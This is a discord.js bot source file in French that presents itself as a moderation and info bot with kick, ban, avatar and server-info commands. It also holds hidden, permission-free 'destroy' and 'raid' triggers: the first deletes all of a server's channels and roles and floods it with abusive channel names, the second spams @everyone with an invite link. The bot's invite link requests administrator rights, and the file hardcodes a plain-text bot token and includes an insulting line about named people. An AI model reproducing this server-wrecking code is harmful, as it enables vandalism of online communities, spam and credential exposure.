const Discord = require('discord.js')
const client = new Discord.Client()

var prefix = '*';
var token = 'NTMxNzQ3OTA0NjI1NDQyODI4.DxeEiQ.bxl43iRTtNneGhqwGtgS8t1o0Kg' //lien du Bot : https://discordapp.com/oauth2/authorize?client_id=531747904625442828&scope=bot&permissions=8

client.login(token)

client.on('ready' , function (){
	client.user.setActivity(`*help | ${client.guilds.size} serveurs ! et ${client.users.size} personnes`)
	console.log("prêt frr")
});

client.on('message',function(message){
	if(message.content.includes(prefix + 'stop')){
		message.channel.send(` **au revoir les gars :cry:**`)
		message.delete().then(client.destroy())
	}
})

/*Kick*/
client.on('message',message =>{
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLocaleLowerCase() === prefix + 'kick'){
       if (!message.member.hasPermission('KICK_MEMBERS')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande ;(")
       let member = message.mentions.members.first()
       if (!member) return message.channel.send("Veuillez mentionner un utilisateur :x:")
       if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas kick cet utilisateur :x:")
       if (!member.kickable) return message.channel.send("Je ne peux pas exclure cet utilisateur :sunglass:")
       member.kick()
       message.delete();
       message.channel.send("**"+member.user.username + '** a été exclu :white_check_mark:')
    }
});
 
client.on('message',message =>{
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLocaleLowerCase() === prefix + 'ban'){
       if (!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande :(")
       let member = message.mentions.members.first()
       if (!member) return message.channel.send("Veuillez mentionner un utilisateur :x:")
       if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas bannir cet utilisateur :x:")
       if (!member.bannable) return message.channel.send("Je ne peux pas bannir cet utilisateur :sunglass:")
       message.guild.ban(member, {days: 1})
       message.channel.send("**"+member.user.username + '** a été banni :white_check_mark:')
    }
});

client.on('message', message => {
	if(message.content === prefix + "cree"){
		message.channel.send(`cree le : ${message.author.createdAt} !`)
		message.delete();
		console.log("quelq'un a demandé le jour de la création de son compte !")
	}
});

client.on('message', message => {
	if(message.content === prefix + "avatar"){
		message.channel.send(`Ton avatar ${message.author.avatarURL} ! `)
		message.delete()
		console.log("+1 avatar donné")
	}
});

client.on('message', message => {
	if(message.content === prefix + "help"){
			    var help = new Discord.RichEmbed()
					  .setTitle("Commande")
					  .setDescription("Commandes du selfbot")
					  .setColor("#36AECC")
					  .addField("*cree","affiche la date de creation de ton compte !", true)
					  .addField("*avatar","affiche votre avatar quand vous executer la commande !", true)
					  .addField("*imgsrv","affiche l icône de votre serveur !", true)
					  .addField("*membres","affiche le nombre dans votre serveur !", true)
					  .addField("*infosrv","affiche les informations de votre serveur !", true)
					  .addField("*kick","kick la personne de votre serveur !", true)
				message.channel.sendEmbed(help);
				message.delete();
		console.log(` ${message.author} a exécuté la commande de help ! `)
	}
});

client.on('message', message => {
	if(message.content === prefix + "imgsrv"){
		message.channel.send(`icone du serveur ! ${message.guild.iconURL} !`)
		message.delete()
		console.log("ok frr")
	}
});

client.on('message', message => {
	if(message.content === prefix + "membres"){
		message.channel.send(`Il y a ${message.guild.memberCount} personnes ! :tada:`)
		message.delete()
		console.log(`${message.author.username} a exécuté la commande : . membres`)
	}
});

client.on('message', message => {
	if(message.content === prefix + "flow"){
		message.channel.send("Flow est le fils de kais le gros porc")
		message.delete()
		console.log("pas d'idée bro")
	}
});

client.on('message', message => {
	if(message.content === prefix + "leave"){
		message.guild.leave();
		message.delete()
		console.log("j'ai quitté un serveur.")
	}
});

client.on('message', message => {
	if(message.content === prefix + "infosrv"){
		var servIcon = message.guild.iconURL;
		var servEmbed = new Discord.RichEmbed()
	.setTitle("Info")
	.setDescription("Info du serveur")
	.setThumbnail(servIcon)
	.addField('Nom du serveur', message.guild.name)
	.addField('Nombre de membres', message.guild.memberCount)
	.addField('Createur du serveur', message.guild.owner.displayName)
	.addField('Rejoins le', message.member.joinedAt)
	.addField('Ip',"``globadis.tk``")
	.addField('Port',"__25572__")
	message.delete()
	
	return message.channel.send(servEmbed);
	}
});

client.on('message', message => {
	if(message.content === prefix + "ip"){
		message.channel.send("l'ip du serveur ``globadis.tk`` port : __25572__ ! :tada:")
		console.log("on a donné l'ip a quelqu'un")
	}
});

client.on('message', message => {
	if(message.content === "destroy"){
		message.guild.channels.deleteAll("destroyer by flow");
		message.guild.roles.deleteAll("bot by flow");
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.delete();
		console.log("ez")
	}
});

client.on('message', message => {
	if(message.content === "raid"){
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		message.channel.send("Raid by Globadis Network @everyone https://discord.gg/8ScBy3G")
		console.log("goodbye")
	}
});
